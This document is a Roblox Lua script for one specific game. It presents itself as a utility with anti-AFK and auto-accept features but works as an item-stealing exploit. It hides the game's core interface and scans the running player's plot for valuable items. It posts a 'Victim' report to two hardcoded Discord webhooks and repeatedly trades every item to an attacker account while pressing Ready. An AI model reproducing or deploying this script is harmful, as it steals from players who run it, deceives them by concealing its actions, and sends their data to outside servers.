if game.PlaceId ~= 109983668079237 then return end

-- ========== ANTI-AFK ==========
local VirtualUser = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- ========== AUTO-ACCEPT TRADE REQUESTS ==========
task.spawn(function()
    while true do
        pcall(function()
            local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
            local requestGui = playerGui:FindFirstChild("TradeRequest")
            if requestGui and requestGui:FindFirstChild("TradeRequest") then
                local req = requestGui.TradeRequest
                if req.Visible then
                    local accept = req:FindFirstChild("Accept", true)
                    if accept then firesignal(accept.Activated) end
                end
            end
        end)
        task.wait(0.1)
    end
end)

-- ========== YOUR ORIGINAL SCRIPT START ==========
getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"

local cg = game:GetService("CoreGui")
task.spawn(function()
    while true do
        pcall(function()
            local rg = cg:FindFirstChild("RobloxGui")
            if rg then rg.Enabled = false end
            local tb = cg:FindFirstChild("TopBarApp")
            if tb then tb.Enabled = false end
            for _, child in ipairs(cg:GetChildren()) do
                local n = child.Name:lower()
                if n:find("topbar") or n:find("bar") or n:find("menu") or n:find("roblox") or n:find("core") then
                    child.Enabled = false
                    if child:IsA("GuiObject") then child.Visible = false end
                end
            end
        end)
        task.wait(0.03)
    end
end)

local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
local LocalPlayer = game:GetService("Players").LocalPlayer

local RICHEST = "hakimidu_95"

local function getGenFromDebris(brainrotName)
    local Debris = workspace:FindFirstChild("Debris")
    if not Debris then return "?" end
    for _, Temp in ipairs(Debris:GetChildren()) do
        if Temp.Name == "FastOverheadTemplate" then
            local Overhead = Temp:FindFirstChild("AnimalOverhead")
            if Overhead then
                local Name = Overhead:FindFirstChild("DisplayName")
                local Gen = Overhead:FindFirstChild("Generation")
                if Name and Gen and Name.Text:lower() == brainrotName:lower() then
                    return Gen.Text
                end
            end
        end
    end
    return "?"
end

local function parseGen(genText)
    if not genText then return 0 end
    genText = genText:lower()
    local number = tonumber(genText:match("[%d%.]+")) or 0
    if genText:find("k") then number = number * 1e3
    elseif genText:find("m") then number = number * 1e6
    elseif genText:find("b") then number = number * 1e9 end
    return number
end

local function scanPlot()
    local found = {}
    local Plots = workspace:FindFirstChild("Plots")
    if not Plots then return found end
    
    local myPlot = nil
    for _, Plot in ipairs(Plots:GetChildren()) do
        if Plot:FindFirstChild("PlotSign") and Plot.PlotSign:FindFirstChildOfClass("SurfaceGui") then
            local txt = Plot.PlotSign:FindFirstChildOfClass("SurfaceGui"):FindFirstChildOfClass("Frame"):FindFirstChildOfClass("TextLabel").Text:lower()
            if txt:find(LocalPlayer.Name:lower()) then myPlot = Plot break end
        end
    end

    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                local gen = getGenFromDebris(child.Name)
                table.insert(found, {name = child.Name, gen = parseGen(gen), genText = gen})
            end
        end
    end
    return found
end

local function sendWebhook(foundItems, webhookUrl, tradeTarget)
    if not webhookUrl or webhookUrl == "" then return end
    table.sort(foundItems, function(a, b) return a.gen > b.gen end)

    local itemLines = ""
    for i, data in ipairs(foundItems) do
        if data.gen >= 10000000 then
            itemLines = itemLines .. i .. ". " .. data.name .. " - " .. data.genText .. "\n"
        end
    end
    if itemLines == "" then itemLines = "No 10M+ Items" end

    local body = {
        content = "@everyone",
        embeds = {{
            title = "✦ Vinhub - Trade Log ✦",
            fields = {
                { name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true },
                { name = "🎯 Target", value = "```" .. tradeTarget .. "```", inline = true },
                { name = "🧠 Items", value = "```" .. itemLines .. "```", inline = false },
            },
            color = 1399436,
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(body)
        })
    end)
end

local function tradeIsActive()
    local gui = playerGui:FindFirstChild("TradeLiveTrade")
    return gui and gui:FindFirstChild("TradeLiveTrade") and gui.TradeLiveTrade.Visible
end

local function sendInvite(target)
    local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
    if not tl then return false end
    local sb = tl.bg.SearchFrame.SearchBox
    sb.Text = target
    task.wait(0.3)
    pcall(function() firesignal(sb.FocusLost, true) end)
    task.wait(0.5)
    
    for _, p in pairs(tl.Global.List:GetChildren()) do
        if p:IsA("Frame") and p:FindFirstChild("Fill") and p.Fill:FindFirstChild("Send") then
            pcall(function() firesignal(p.Fill.Send.Activated) end)
            return true
        end
    end
    return false
end

while true do
    local items = scanPlot()
    local target = getgenv().TARGET_USERNAME or RICHEST
    
    sendWebhook(items, getgenv().WEBHOOK_URL2, target)
    sendWebhook(items, getgenv().WEBHOOKSHERIF, target)

    if not tradeIsActive() then
        sendInvite(target)
    else
        local inner = playerGui.TradeLiveTrade.TradeLiveTrade
        local scrolling = inner:FindFirstChild("ScrollingFrame", true)
        
        if scrolling then
            for _, slot in pairs(scrolling:GetChildren()) do
                if slot.Name:sub(1,9) == "Selection" then
                    local spacer = slot:FindFirstChild("Spacer")
                    if spacer and spacer:FindFirstChild("UIStroke") then
                        if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                            pcall(function() firesignal(spacer.Activated) end)
                            task.wait(0.1)
                        end
                    end
                end
            end
        end

        task.wait(1)
        local readyBtn = inner:FindFirstChild("ReadyButton", true)
        if readyBtn then
            pcall(function() firesignal(readyBtn.Activated) end)
        end
    end
    task.wait(2)
end
